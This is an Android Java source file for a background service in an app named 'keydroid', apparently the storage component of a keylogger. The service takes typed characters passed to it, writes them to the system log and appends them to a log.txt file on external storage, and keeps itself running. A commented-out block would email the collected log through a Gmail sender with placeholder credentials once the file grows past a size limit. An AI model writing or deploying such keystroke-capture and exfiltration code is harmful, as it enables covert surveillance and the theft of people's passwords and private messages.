package com.keydroid;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

/**
 * Created by Abhishek on 27-June-17.
 */

public class BackService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();



    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//
       if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED) {

//
          if(intent!=null)
          {
              Log.e("SimpleServices"," "+ intent.getStringExtra("Character"));

            final long fileSize =   writeToSDFile((intent.getStringExtra("Character")));

              new Thread(new Runnable() {

                  @Override
                  public void run() {
                      try {
// Gmail Sender
      //                    if(fileSize>50) {


//

  //                            GMailSender sender = new GMailSender("youremail@gmail.com",
    //                                      "password"); // enter email and password of sender 
  //                                sender.sendMail("Hello from JavaMail", "Body from JavaMail", "youremail@gmail.com", "youremail@gmail.com");// sender and receiver are same.
                        //      }
                      } catch (Exception e) {
                          Log.e("SendMail", e.getMessage(), e);
                     }
                  }

              }).start();
          }
} 

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private long writeToSDFile(String data){

        File root = android.os.Environment.getExternalStorageDirectory();


        File dir = new File (root.getAbsolutePath());
        dir.mkdirs();
        File file = new File(dir, "log.txt");
        long fileSize = file.length();
        Log.e("SimpleServices Size "," "+  file.length());

        try {
            FileOutputStream f = new FileOutputStream(file,true);
            PrintWriter pw = new PrintWriter(f);
            pw.println(data);
            //  pw.println("Hello");
            pw.flush();
            pw.close();
            f.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            Log.i("Number", "******* File not found. Did you" +
                    " add a WRITE_EXTERNAL_STORAGE permission to the   manifest?");
        } catch (IOException e) {
            e.printStackTrace();
        }
        // tv.append("\n\nFile written to "+file);
        return  fileSize;
    }

}
